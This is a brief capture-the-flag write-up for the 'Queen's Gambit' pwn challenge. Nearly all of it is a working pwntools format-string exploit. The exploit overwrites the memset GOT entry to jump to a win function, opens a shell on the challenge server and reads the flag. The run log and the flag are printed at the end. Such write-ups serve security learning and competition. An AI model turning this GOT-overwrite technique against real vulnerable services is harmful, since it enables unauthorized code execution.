## Queen's Gambit

```
125

Practice your moves on Mr. Shaibel's chess server!

nc challenges.ctfd.io 30458
```

Tags: _pwn_ _x86-64_ _format-string_

Exploit:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chess')
binary.symbols['win'] = 0x4011c2

if args.REMOTE:
	p = remote('challenges.ctfd.io', 30458)
else:
	p = process(binary.path)

# manually from stack
offset = 22

# copied from screen
s = '''
Congratulations blah! Your answer was correct!

Your winning move was:

'''

# the 4 spaces after Ra1 was determined from the stack to align stack
# must be spaces for scanf
payload  = b'Ra1    '
payload += b'%' + str((binary.sym.win & 0xFFFF) - len(s) - len(payload)).rjust(6,'0').encode() + b'c'
payload += b'%' + str(offset + 2).rjust(4,'0').encode() + b'$hn'
payload += p64(binary.got.memset)

p.sendlineafter('>> ','1')
p.sendlineafter('>> ','blah')
p.sendlineafter('>> ',payload)

# take out the trash
null = payload.find(b'\x00')
log.info('null loc: ' + str(null))
p.recvuntil(payload[null-2:null])

p.interactive()
```

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/tenablectf2021/queensgambit/chess'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challenges.ctfd.io on port 30458: Done
[*] null loc: 26
[*] Switching to interactive mode
Welcome, Mr Shaibel...

#/bin/sh: 0: can't access tty; job control turned off
# $ ls -l
total 40
drwxr-xr-x 1 1000 1000  4096 Jan 19 14:37 bin
-rwxr-xr-x 1 1000 1000 14648 Jan 19 16:07 chess
drwxr-xr-x 1 1000 1000  4096 Jan 19 14:04 dev
-rwxr--r-- 1 1000 1000    40 Jan 18 18:11 flag.txt
drwxr-xr-x 1 1000 1000  4096 Jan 19 14:04 lib
drwxr-xr-x 1 1000 1000  4096 Jan 19 14:04 lib32
drwxr-xr-x 1 1000 1000  4096 Jan 19 14:04 lib64
# $ cat flag.txt
flag{And_y0u_didnt_ev3n_n33d_th3_pills}
```
